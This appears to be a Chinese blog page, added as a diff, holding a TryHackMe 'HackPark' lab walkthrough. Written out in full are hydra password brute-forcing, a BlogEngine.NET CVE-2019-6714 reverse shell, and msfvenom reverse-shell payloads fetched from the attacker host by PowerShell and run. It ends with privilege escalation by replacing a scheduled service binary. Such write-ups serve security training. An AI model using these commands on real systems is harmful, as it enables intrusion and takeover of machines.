@@ -1,0 +1,633 @@
+<!DOCTYPE html>
+<html lang="en">
+    
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+    <meta name="description" content="Try Hack Me-HackPark" />
+    <meta name="hexo-theme-A4" content="v1.8.8" />
+    <link rel="alternate icon" type="image/webp" href="/img/favicon.webp">
+    <title>Hexo</title>
+
+    
+        
+<link rel="stylesheet" href="/css/highlight/style1.css">
+
+        
+<link rel="stylesheet" href="/css/reset.css">
+
+        
+<link rel="stylesheet" href="/css/markdown.css">
+
+        
+<link rel="stylesheet" href="/css/fonts.css">
+ 
+         <!--注意：首页既不是post也不是page-->
+        
+            
+<link rel="stylesheet" href="/css/waline.css">
+
+        
+        
+        
+<link rel="stylesheet" href="/css/ui.css">
+ 
+        
+<link rel="stylesheet" href="/css/style.css">
+
+
+        
+            <!--返回顶部css-->
+            
+<link rel="stylesheet" href="/css/returnToTop.css">
+
+            
+<link rel="stylesheet" href="/css/unicons.css">
+
+        
+        
+            <!--目录-->
+            
+<link rel="stylesheet" href="/css/toc.css">
+
+        
+    
+
+    
+        
+<link rel="stylesheet" href="/css/returnToLastPage.css">
+
+    
+    
+   
+<link rel="stylesheet" href="/css/lightgallery.min.css">
+
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+    
+    <style>
+        :root {
+            --waline-theme-color: #000000; 
+            --waline-color: #000000; 
+            --waline-border-color: #000000; 
+            --waline-white: #000000; 
+            --waline-bgcolor-light: #ffffff;  
+        }
+        body {
+            color: #000000;
+            background: #e4e4e4;
+        }
+        .post-md code {
+            background: #212425;
+            color: white; 
+        }
+        .post-md pre, .post-md .highlight {
+            background: #212425;
+            color: white; 
+        }
+        pre .string, pre .value, pre .inheritance, pre .header, pre .ruby .symbol, pre .xml .cdata {
+            color: #000000;
+        }
+        pre .number, pre .preprocessor, pre .built_in, pre .literal, pre .params, pre .constant {
+            color: #000000;
+        }
+        .year-font-color {
+            color: #000000 !important;
+        }
+        .wl-card span.wl-nick {
+            color: #000000; 
+        }
+        .wl-card .wl-badge {
+            border: 1px solid #000000;
+            color: #000000; 
+        }
+        .wl-btn {
+            border: 1px solid #000000; 
+            color:  #000000;  
+        }
+        .wl-btn.primary {
+            color: #ffffff; 
+        }
+        .wl-header label {
+            color: #000000;
+        }
+        a {
+            color: rgb(239, 112, 96);
+        }
+
+        .post-md a {
+            color: rgb(239, 112, 96);
+        }
+
+        .nav li a {
+            color: rgb(239, 112, 96);
+        }
+
+        .archive-main a:link {
+            color: rgb(239, 112, 96);
+        }
+        .archive-main a:visited {
+            color: rgb(239, 112, 96); 
+        }
+
+        .archive li span {
+            color: #000000;
+        }
+
+        .post-main-title {
+            color: #000000;
+        }
+
+        .post-md h1,
+        .post-md h2,
+        .post-md h3,
+        .post-md h4,
+        .post-md h5,
+        .post-md h6 {
+            color: #000000;
+        }
+
+        [data-waline] p {
+            color: #000000;
+        }
+        [data-waline] a {
+            color: #000000;
+        } 
+        .wl-sort li.active {
+            color: #000000;
+        }
+
+        .wl-card .wl-meta>span {
+            background: #ffffff;
+        }
+
+        .paper {
+            background: #e4e4e4;
+        }
+
+        .index-main {
+            background: #ffffff;
+        }
+
+        .paper-main {
+            background: #ffffff;
+        }
+
+        .wl-panel {
+            background: #ffffff;
+        }
+
+        .archive li:nth-child(odd) {
+            background: #ffffff;
+            ;
+        }
+
+        .archive li:nth-child(even) {
+            background: #ffffff;
+        }
+
+        .post-md table tr:nth-child(odd) td {
+            background: #ffffff;
+        }
+
+        .post-md table tr:nth-child(even) td {
+            background: #ffffff;
+        }
+
+    
+        .progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+        .return-to-last-progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .return-to-last-progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .return-to-last-progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+         .left-toc-container::-webkit-scrollbar-thumb {
+            background-color: #000000; /* 设置滚动条拖动块的颜色 */
+        }
+
+        .bs-docs-sidebar .nav>.active>a,
+        .bs-docs-sidebar .nav>li>a:hover,
+        .bs-docs-sidebar .nav>li>a:focus {
+            color: rgb(239, 112, 96);
+            border-left-color: rgb(239, 112, 96);
+        }
+        .bs-docs-sidebar .nav>li>a {
+            color:  #000000;
+        }
+    </style>
+
+    
+    <body>
+        
+            <div class="left-toc-container">
+                <nav id="toc" class="bs-docs-sidebar"></nav>
+            </div>
+        
+        <div class="paper">
+            
+            
+            
+            
+                <div class="shadow-drop-2-bottom paper-main">
+                    
+
+
+<div class="header">
+    <div class="header-container">
+        <img style="
+        width: 56px;
+        height: auto;" alt="^-^" cache-control="max-age=86400" class="header-img" src="/img/favicon.webp" width="10%"></img>
+        <div class="header-content">
+            <a class="logo" href="/">Hexo</a> 
+            <span class="description"></span> 
+        </div>
+        
+    </div>
+    
+   
+    <ul class="nav">
+        
+            
+                <li><a href="/">首页</a></li>
+            
+        
+            
+                <li><a href="/list/">文章</a></li>
+            
+        
+            
+                <li><a href="/tags/">标签</a></li>
+            
+        
+            
+                <li><a href="/categories/">分类</a></li>
+            
+        
+            
+                <li><a href="/about/">关于</a></li>
+            
+        
+            
+                <li><a href="/friends/">友链</a></li>
+            
+        
+    </ul>
+</div> 
+        
+                    
+                    
+
+                    
+                    
+                    
+                    <!--说明是文章post页面-->
+                    
+                        <div class="post-main">
+
+    
+        <div class="post-main-title">
+            Try Hack Me-HackPark
+        </div>
+      
+    
+
+    <div class="post-md">
+        
+            
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E7%88%86%E7%A0%B4%E5%AF%86%E7%A0%81%EF%BC%8C%E7%99%BB%E5%BD%95%E5%90%8E%E5%8F%B0"><span class="post-toc-text">爆破密码，登录后台</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E8%8E%B7%E5%BE%97webshell"><span class="post-toc-text">获得webshell</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E4%BD%BF%E7%94%A8metesploit%E7%9B%91%E5%90%ACshell"><span class="post-toc-text">使用metesploit监听shell</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E6%8F%90%E6%9D%83"><span class="post-toc-text">提权</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E4%B8%8D%E9%80%9A%E8%BF%87metesploit%E7%9B%91%E5%90%ACshell%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="post-toc-text">不通过metesploit监听shell的方式</span></a></li></ol>
+            
+        
+        <link rel="stylesheet" type="text/css" href="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="爆破密码，登录后台"><a href="#爆破密码，登录后台" class="headerlink" title="爆破密码，登录后台"></a>爆破密码，登录后台</h2><p>使用gobuster配合seclists的字典来爆破后台路径</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./gobuster <span class="built_in">dir</span> -u 10.10.40.22 -w /usr/share/seclists/Discovery/Web-Content/common.txt</span><br></pre></td></tr></table></figure>
+
+<p>发现后台路径</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301032158581.png" title="image-20230103215608183" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301032158581.png" alt="image-20230103215608183"></a></p>
+<p>然后发送表单数据，可以知道是POST请求</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301032158572.png" title="image-20230103215732978" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301032158572.png" alt="image-20230103215732978"></a></p>
+<p>使用<a target="_blank" rel="noopener" href="https://github.com/vanhauser-thc/thc-hydra">hydra</a>爆破密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l admin -P /usr/share/seclists/Passwords/darkweb2017-top10000.txt    10.10.40.22 http-form-post <span class="string">&quot;/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=vw5J1ZVXeuOsqHTRBMThsDt0My7yl9%2F58xs%2F9JecZf3L2TxMaYYCfEmvjBo7dAo2xU9lY9qG1RqV9Q%2FwCyuJhBGGIbX1BF4vSV9uhs1Jp%2B%2BDW8x3IyAETgYpstaFI%2B5vjy0OXYvDA%2F%2Bo%2BltAyih7HFg3YOCIFUxjN5Uqda41582vq4gw&amp;__EVENTVALIDATION=F16dU6mFH%2FZqYExyyFz8QDA2ZfV%2F9lhAJf8knWmPcA%2BSalr%2FtNT8OI%2FcLoS1WfVqi%2BcLjNuR278Z6EUr21MfgT6qFfcnIC%2FnBVi32%2BlQ2QUhax%2F0FiRUxsFmaFhgRgK6DPIkxvtN8gA53zqN8cVhWrMuB7NhxDbpKdxVFan86w5lUB%2BX&amp;ctl00%24MainContent%24LoginUser%24UserName=admin&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed&quot;</span> -Vv</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -Vv 显示破解过程</span></span><br><span class="line"><span class="comment"># -l 表示单个密码</span></span><br><span class="line"><span class="comment"># -P 表示多个密码，一般为文件</span></span><br><span class="line"><span class="comment">#Login Failedb 表示的是如果登录失败，页面返回的内容</span></span><br></pre></td></tr></table></figure>
+
+<p>这里的密码要用<code>^PASS^</code>来占位</p>
+<p>得到密码:<code>1qaz2wsx</code></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301032244556.png" title="image-20230103224403526" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301032244556.png" alt="image-20230103224403526"></a></p>
+<table>
+<thead>
+<tr>
+<th><strong>命令</strong></th>
+<th><strong>描述</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>hydra -P <wordlist> -v <ip> <protocol></td>
+<td>针对您选择的协议进行暴力破解</td>
+</tr>
+<tr>
+<td>hydra -v -V -u -L <username list> -P <password list> -t 1 -u <ip> <protocol></td>
+<td>您可以使用 Hydra 来暴力破解用户名和密码。它将遍历列表中的每个组合。（-vV &#x3D; 详细模式，显示登录尝试）</td>
+</tr>
+<tr>
+<td>hydra -t 1 -V -f -l <username> -P <wordlist> rdp:&#x2F;&#x2F;<ip></td>
+<td>使用密码列表攻击 Windows 远程桌面。</td>
+</tr>
+<tr>
+<td>hydra -l <username> -P .<password list> $ip -V http-form-post ‘&#x2F;wp-login.php:log&#x3D;^USER^&amp;pwd&#x3D;^PASS^&amp;wp-submit&#x3D;Log In&amp;testcookie&#x3D;1:S&#x3D;Location’</td>
+<td>为 Hydra 提出更具体的要求以进行暴力破解。</td>
+</tr>
+</tbody></table>
+<h2 id="获得webshell"><a href="#获得webshell" class="headerlink" title="获得webshell"></a>获得webshell</h2><p>登入后台，发现这个网站的CMS为<code>BlogEngine.NET</code>，且版本为3.3.6.0</p>
+<p>在<a target="_blank" rel="noopener" href="http://www.exploit-db.com/">exploit 数据库存档</a>查找相关漏洞</p>
+<p>找到<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/46353">CVE-2019-6714</a><br>按照要求，改一下exp里的ip和port，把文件名改为PostView.ascx，然后再上传</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301032301496.png" title="image-20230103230104393" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301032301496.png" alt="image-20230103230104393"></a></p>
+<p>kali开启监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 9999</span><br></pre></td></tr></table></figure>
+
+<p>访问<code>/?theme=../../App_Data/files</code>后得到反弹shell</p>
+<p>执行<code>whoami</code>得到运行这个网站的人</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301032303588.png" title="image-20230103230346561" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301032303588.png" alt="image-20230103230346561"></a></p>
+<h2 id="使用metesploit监听shell"><a href="#使用metesploit监听shell" class="headerlink" title="使用metesploit监听shell"></a>使用metesploit监听shell</h2><p>然后改用metesploit的meterpreter来进行监听</p>
+<p>要先找到这个windows的漏洞，然后再用msfvenom生成攻击载荷</p>
+<p>先用<code>systeminfo</code>得到这个windows的信息，然后用<a target="_blank" rel="noopener" href="https://github.com/bitsadmin/wesng">wes-ng</a>来查找漏洞</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 wes.py system.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301032316631.png" title="image-20230103231646552" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301032316631.png" alt="image-20230103231646552"></a></p>
+<p>这里得到的信息其实没有那么重要，因为我们已经有一个shell了</p>
+<p>我们可以生成一个反弹shell载荷，让目标主机下载下来，然后让他执行这个载荷，就可以反弹shell了</p>
+<p>生成payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.18.104.32  LPORT=9999 -f exe &gt;shell.exe</span><br></pre></td></tr></table></figure>
+
+<p>在kali上开启一个python服务，通过之前的shell，让目标主机下载下来</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server   </span><br></pre></td></tr></table></figure>
+
+<p>目标主机上：</p>
+<p>上传到<code>C:\Windows\Temp</code>因为这个目录往往是可写的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c <span class="string">&quot;Invoke-WebRequest -Uri &#x27;http://10.18.104.32:8000/shell.exe&#x27; -OutFile &#x27;C:\Windows\Temp\shell.exe&#x27;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>shell.exe被成功上传</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301032330196.png" title="image-20230103233054145" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301032330196.png" alt="image-20230103233054145"></a></p>
+<p>然后开启metesploit</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 10.18.104.32</span><br><span class="line"><span class="built_in">set</span> LPORT 9999</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>在目标主机执行shell.exe</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell.exe</span><br></pre></td></tr></table></figure>
+
+<p>meterpreter成功上线目标主机</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301032334621.png" title="image-20230103233429588" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301032334621.png" alt="image-20230103233429588"></a></p>
+<p>执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysinfo</span><br></pre></td></tr></table></figure>
+
+<p>可以查看系统信息</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301041332791.png" title="image-20230104133205675" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301041332791.png" alt="image-20230104133205675"></a></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>我们要进行提权，使用<a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASbat"><strong>WinPEAS</strong></a>来查看相关的信息</p>
+<p>使用相同的方式来上传这个文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c <span class="string">&quot;Invoke-WebRequest -Uri &#x27;http://10.18.104.32:8000/winPEAS.bat&#x27; -OutFile &#x27;C:\Windows\Temp\winPEAS.bat&#x27;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>因为系统服务大多是以system权限启动的，所以其对应的二进制也就以system权限启动。</p>
+<p>所以这里提权的方式是，修改系统服务对应的二进制文件，将其修改为我们的攻击载荷，即上面的<code>shell.exe</code>。</p>
+<p>用winpeas.bat可以看到一些服务对应的二进制文件</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301041359769.png" title="image-20230104135959702" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301041359769.png" alt="image-20230104135959702"></a></p>
+<p>使用winpeas.exe直接查看服务信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winpeas.exe serviceinfo</span><br></pre></td></tr></table></figure>
+
+<p>winpeas.exe参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">domain               Enumerate domain information</span><br><span class="line">systeminfo           Search system information</span><br><span class="line">userinfo             Search user information</span><br><span class="line">processinfo          Search processes information</span><br><span class="line">servicesinfo         Search services information</span><br><span class="line">applicationsinfo     Search installed applications information</span><br><span class="line">networkinfo          Search network information</span><br><span class="line">windowscreds         Search windows credentials</span><br><span class="line">browserinfo          Search browser information</span><br><span class="line">filesinfo            Search generic files that can contains credentials</span><br><span class="line">fileanalysis         Search specific files that can contains credentials and for regexes inside files</span><br><span class="line">eventsinfo           Display interesting events information</span><br><span class="line"></span><br><span class="line">quiet                Do not print banner</span><br><span class="line">notcolor             Don&#x27;t use ansi colors (all white)</span><br><span class="line">searchpf             Search credentials via regex also in Program Files folders</span><br><span class="line">wait                 Wait for user input between checks</span><br><span class="line">debug                Display debugging information - memory usage, method execution time</span><br><span class="line">log[=logfile]        Log all output to file defined as logfile, or to &quot;out.txt&quot; if not specified</span><br><span class="line">MaxRegexFileSize=1000000        Max file size (in Bytes) to search regex in. Default: 1000000B</span><br><span class="line"></span><br><span class="line">Additional checks (slower):</span><br><span class="line">-lolbas              Run additional LOLBAS check</span><br><span class="line">-linpeas=[url]       Run additional linpeas.sh check for default WSL distribution, optionally provide custom linpeas.sh URL</span><br><span class="line">                     (default: https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh)</span><br></pre></td></tr></table></figure>
+
+<p>可以看到存在可以提权的服务<code>WindowsScheduler</code></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301041418128.png" title="image-20230104141834072" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301041418128.png" alt="image-20230104141834072"></a></p>
+<p>去到对应目录，可以发现存在包含日志的<code>Events</code>目录</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301041422881.png" title="image-20230104142213846" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301041422881.png" alt="image-20230104142213846"></a></p>
+<p>查看日志，发现他是间隔30s左右，执行一次<code>Message.exe</code>，且以Administrator权限执行</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301041422335.png" title="image-20230104142244294" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301041422335.png" alt="image-20230104142244294"></a></p>
+<p>再去看这个文件，发现可以修改</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301041423172.png" title="image-20230104142318141" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301041423172.png" alt="image-20230104142318141"></a></p>
+<p>把之前生成的shell.exe上传到这里，改名为Message.exe，然后再开启一个监听，就可以得到system权限的shell</p>
+<p>直接使用meterpreter上传</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">upload shell.exe <span class="string">&quot;C:\Program Files (x86)\SystemScheduler\1.exe&quot;</span></span><br><span class="line"><span class="built_in">mv</span> Message.exe Message.exe.bak</span><br><span class="line"><span class="built_in">mv</span> 1.exe Message.exe</span><br><span class="line">background</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>等他执行我们上传上去的恶意Message.exe后，就可以得到system权限的shell</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301041432132.png" title="image-20230104143237095" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301041432132.png" alt="image-20230104143237095"></a></p>
+<p>然后在<code>C:\Users\jeff\Desktop\user.txt</code>得到user flag</p>
+<p>在<code>C:\Users\Administrator\Desktop\root.txt</code>得到root flag</p>
+<h2 id="不通过metesploit监听shell的方式"><a href="#不通过metesploit监听shell的方式" class="headerlink" title="不通过metesploit监听shell的方式"></a>不通过metesploit监听shell的方式</h2><p>可以使用netcat，但是msfvenom生成payload的命令有所不同</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=<span class="variable">$lhost</span> LPORT=<span class="variable">$lport</span> -e x86/shikata_ga_nai -f exe -o reverse.exe</span><br><span class="line">nc -lnvp <span class="variable">$lport</span></span><br></pre></td></tr></table></figure>
+
+</div><script src="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
+    </div>
+
+    <div class="post-meta">
+        <i>
+        
+            <span>2024-03-01</span>
+            
+                <span>该篇文章被 John Doe</span>
+            
+            
+                <span>打上标签:
+                    
+                    
+                        <a href='/tags/Try-Hack-Me/'>
+                            Try Hack Me
+                        </a>
+                    
+                </span>
+             
+             
+                <span>归为分类:
+                    
+                    
+                        <a href='/categories/Tryhackme/'>
+                            Tryhackme
+                        </a>
+                    
+                </span>
+            
+        
+        </i>
+    </div>
+    <br>
+    
+    <!-- <div class="post-footer-pre-next">
+        <span>上一篇：<a href=""></a></span>
+        <span class="post-footer-pre-next-last-span-right">上一篇：<a href=""></a></span>
+    </div> -->
+
+    
+        
+    <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+         
+    </div>
+    
+        
+
+    <div id="waline"></div>
+    <script type="module"  >
+        import { init } from 'https://npm.elemecdn.com/hexo-theme-a4@latest/source/js/waline.mjs'; 
+        function loadWaline() {
+            init({
+                el: '#waline',
+                serverURL: 'https://a4-talk.vercel.app',
+                lang: 'zh-CN',
+                dark: 'body[class~="dark-mode"]',
+                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
+                search: false, // 禁止表情包搜索
+                reaction: false, // 对文章打分
+                pageview: false, // 浏览量统计
+                comment: false, // 评论数统计
+
+                locale: {
+                    placeholder: '欢迎评论', 
+                    sofa: ''
+                },
+            });
+            
+        }
+        window.addEventListener('DOMContentLoaded', loadWaline);
+    </script>
+
+
+
+    
+    
+    
+    </div>
+
+
+     
+</div>
+
+
+
+                                      
+                    
+                    
+                    <div class="footer">
+    
+        <span> 
+            © 1949-2024 China 
+
+            
+                
+
+            
+        </span>
+    
+</div>
+<!--这是指一条线往下的内容-->
+<div class="footer-last">
+    
+            <span>🌊面朝大海，春暖花开🌸</span>
+            
+                <span class="footer-last-span-right"><i>本站由<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/index.html">Hexo</a>驱动｜使用<a target="_blank" rel="noopener" href="https://github.com/HiNinoJay/hexo-theme-A4">Hexo-theme-A4</a>主题</i></span>
+            
+    
+</div>
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>
+
+    <!--目录-->
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript" ></script>
+        
+<script src="/js/toc.js"></script>
+
+    
+
+    
+<script src="/js/randomHeaderContent.js"></script>
+
+    <!--回到顶部按钮-->
+    
+        
+<script src="/js/returnToTop.js"></script>
+
+    
+
+    
+        
+<script src="/js/returnToLastPage.js"></script>
+
+    
+
+
+
+
+
+<script src="/js/lightgallery.min.js"></script>
+
+
+
+                </div>
+            
+            
+                <!-- 回到顶部的按钮-->  
+                <div class="progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+            
+                <!-- 返回的按钮-->  
+                <div class="return-to-last-progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+    </body>
+
+
+    <!--暗黑模式-->
+    <script src="/js/darkmode-js.min.js"></script>
+    <script>
+        function addDarkmodeWidget() {
+        const options = {
+            bottom: '53px', // default: '32px'
+            right: 'unset', // default: '32px'
+            left: '42px', // default: 'unset'
+            time: '0.3s', // default: '0.3s'
+            mixColor: '#fff', // default: '#fff'
+            backgroundColor: ' #e4e4e4  ',  // default: '#fff'
+            buttonColorDark: '#100f2c',  // default: '#100f2c'
+            buttonColorLight: '#fff', // default: '#fff'
+            saveInCookies: true, // default: true,
+            label: '🌓', // default: ''
+            autoMatchOsTheme: true // default: true
+        }
+    
+        const darkmode = new Darkmode(options);
+        darkmode.showWidget();
+        
+        }
+        window.addEventListener('load', addDarkmodeWidget);
+    </script>
+  
+</html>
